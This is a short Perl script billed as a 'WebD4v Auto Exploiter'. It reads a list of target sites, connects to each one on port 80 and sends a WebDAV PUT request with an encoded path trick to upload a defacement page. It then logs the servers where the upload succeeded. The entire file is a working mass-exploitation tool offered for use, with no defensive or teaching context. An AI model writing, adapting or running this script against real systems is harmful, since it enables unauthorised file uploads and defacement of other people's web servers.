#!/usr/bin/perl 

use IO::Socket;
use IO::Socket::INET;

if ($^O =~ /Win/) { system("cls"); } else { system("clear"); }

print q{ 

              WebD4v <= Auto Exploiter
                  by CrashBandicot
           

};


open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){

chomp($_);
$target = $_;
if($target =~ /http:\/\/(.*)\//){ $target = $1; 
  } elsif($target =~ /http:\/\/(.*)/){$target = $1;
  } elsif($target =~ /https:\/\/(.*)\//){ $target = $1;
   } elsif($target =~ /https:\/\/(.*)/){$target = $1; }


    my $sock = IO::Socket::INET->new (PeerAddr => $target, 
                    PeerPort => "80",
                    Proto    => 'tcp') or next;

 print " [*] Try Hack $target \n";

$path =~ s/\//%c0%af\//;
        print $sock "PUT /".$path."fucked.html HTTP/1.1\r\n";
        print $sock "Host: ".$target."\r\n";
        print $sock 'Content-Type: text/html; charset="utf-8"'."\r\n";
        print $sock "Connection:close\r\n";
        print $sock "Content-Length: 6\r\n\r\n";
        print $sock "fucked"."\r\n";

 
 $zn = join('',<$sock>);
 if($zn =~/201 Created/) {

print "\n[+] $target (Success) \n";
open (TEXT, '>>serveur_webdav.txt');
print TEXT "$target\n";
close (TEXT);
close($sock);


 }


      }
